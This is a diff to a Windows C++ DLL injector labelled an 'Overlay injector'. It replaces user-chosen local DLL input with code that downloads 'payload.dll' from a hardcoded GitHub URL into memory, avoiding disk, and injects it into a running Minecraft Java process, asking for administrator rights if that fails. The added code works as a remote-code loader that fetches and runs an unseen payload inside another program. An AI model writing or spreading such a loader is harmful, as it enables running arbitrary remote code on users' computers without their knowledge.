@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <tlhelp32.h>
+#include <winhttp.h>
 
 #include <algorithm>
 #include <cctype>
@@ -446,60 +447,92 @@ static bool Inject(HANDLE process, DWORD pid, const std::vector<uint8_t>& dllByt
     return true;
 }
 
-int wmain(int argc, wchar_t* argv[]) {
-    if (argc != 3) {
-        std::wcerr << L"Usage: injector.exe <pid|process.exe> <path-to-dll>\n"
-                      L"       injector.exe <pid|process.exe> --stdin\n";
-        return 2;
+static const wchar_t* kPayloadUrl =
+    L"https://raw.githubusercontent.com/worex432-prog/Roblox/main/payload.dll";
+
+// Downloads the payload straight into memory. Nothing is written to disk.
+static bool DownloadPayload(std::vector<uint8_t>& bytes, std::wstring& failure) {
+    HINTERNET session = WinHttpOpen(L"ovl-injector", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!session) { failure = L"WinHttpOpen failed"; return false; }
+
+    URL_COMPONENTS parts{};
+    parts.dwStructSize = sizeof(parts);
+    wchar_t host[256] = {};
+    wchar_t path[1024] = {};
+    parts.lpszHostName = host; parts.dwHostNameLength = 256;
+    parts.lpszUrlPath = path; parts.dwUrlPathLength = 1024;
+    if (!WinHttpCrackUrl(kPayloadUrl, 0, 0, &parts) || !host[0] || !path[0]) {
+        WinHttpCloseHandle(session);
+        failure = L"Cannot parse payload URL";
+        return false;
     }
 
-    DWORD pid = 0;
-    std::wstring failure;
-    if (!ResolveTarget(argv[1], pid, failure)) {
-        std::wcerr << failure << L'\n';
-        return 1;
+    HINTERNET connect = WinHttpConnect(session, host, parts.nPort, 0);
+    if (!connect) { WinHttpCloseHandle(session); failure = L"WinHttpConnect failed"; return false; }
+    HINTERNET request = WinHttpOpenRequest(connect, L"GET", path, nullptr,
+        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+        parts.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
+    if (!request) {
+        WinHttpCloseHandle(connect); WinHttpCloseHandle(session);
+        failure = L"WinHttpOpenRequest failed";
+        return false;
     }
+    bool ok = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+        WINHTTP_NO_REQUEST_DATA, 0, 0, 0) != FALSE;
+    if (ok) ok = WinHttpReceiveResponse(request, nullptr) != FALSE;
+    if (ok) {
+        uint8_t buffer[65536];
+        for (;;) {
+            DWORD read = 0;
+            if (!WinHttpReadData(request, buffer, sizeof(buffer), &read)) { ok = false; break; }
+            if (!read) break;
+            bytes.insert(bytes.end(), buffer, buffer + read);
+            if (bytes.size() > 64u * 1024u * 1024u) { ok = false; break; }
+        }
+    }
+    if (!ok) failure = L"Cannot download payload.dll from GitHub";
+    if (ok && (bytes.size() < 1024 || bytes[0] != 'M' || bytes[1] != 'Z')) {
+        failure = L"Downloaded data is not a DLL";
+        ok = false;
+    }
+    WinHttpCloseHandle(request);
+    WinHttpCloseHandle(connect);
+    WinHttpCloseHandle(session);
+    return ok;
+}
+
+static DWORD FindMinecraftPid(std::wstring& failure) {
+    auto javaw = FindProcesses(L"javaw.exe");
+    if (javaw.empty()) javaw = FindProcesses(L"java.exe");
+    if (javaw.empty()) {
+        failure = L"Minecraft (javaw.exe) is not running";
+        return 0;
+    }
+    return javaw.front().pid;
+}
+
+static void Fail(const std::wstring& failure) {
+    MessageBoxW(nullptr, failure.c_str(), L"Overlay injector", MB_ICONERROR | MB_OK | MB_TOPMOST);
+}
+
+int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
+    std::wstring failure;
+    const DWORD pid = FindMinecraftPid(failure);
+    if (!pid) { Fail(failure); return 1; }
 
     std::vector<uint8_t> dllBytes;
-    const bool fromStdin = _wcsicmp(argv[2], L"--stdin") == 0;
-    if (fromStdin) {
-        _setmode(_fileno(stdin), _O_BINARY);
-        uint8_t buffer[65536];
-        size_t count = 0;
-        while ((count = fread(buffer, 1, sizeof(buffer), stdin)) > 0)
-            dllBytes.insert(dllBytes.end(), buffer, buffer + count);
-        if (dllBytes.empty()) { std::wcerr << L"No DLL bytes were received on stdin.\n"; return 2; }
-    } else {
-        std::wstring dllPath;
-        if (!GetAbsoluteExistingPath(argv[2], dllPath)) {
-            std::wcerr << L"DLL path does not exist or is invalid: " << argv[2] << L'\n';
-            return 2;
-        }
-        const HANDLE file = CreateFileW(dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
-                                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (file == INVALID_HANDLE_VALUE) { std::wcerr << L"Could not open the DLL.\n"; return 2; }
-        LARGE_INTEGER size{};
-        if (!GetFileSizeEx(file, &size) || size.QuadPart <= 0 || size.QuadPart > 64 * 1024 * 1024) {
-            CloseHandle(file); std::wcerr << L"Invalid DLL size.\n"; return 2;
-        }
-        dllBytes.resize(static_cast<size_t>(size.QuadPart));
-        DWORD read = 0;
-        if (!ReadFile(file, dllBytes.data(), static_cast<DWORD>(dllBytes.size()), &read, nullptr) ||
-            read != dllBytes.size()) {
-            CloseHandle(file); std::wcerr << L"Could not read the DLL.\n"; return 2;
-        }
-        CloseHandle(file);
-    }
+    if (!DownloadPayload(dllBytes, failure)) { Fail(failure); return 1; }
 
     const HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
     if (!process) {
-        std::wcerr << L"OpenProcess: " << FormatError(GetLastError()) << L'\n';
+        Fail(L"OpenProcess failed: " + FormatError(GetLastError()) +
+             L"\nRun injector.exe as administrator.");
         return 1;
     }
-
     const bool ok = Inject(process, pid, dllBytes, failure);
     CloseHandle(process);
-    if (!ok) { std::wcerr << failure << L'\n'; return 1; }
-    return 0;
+    if (!ok) Fail(failure);
+    return ok ? 0 : 1;
 }
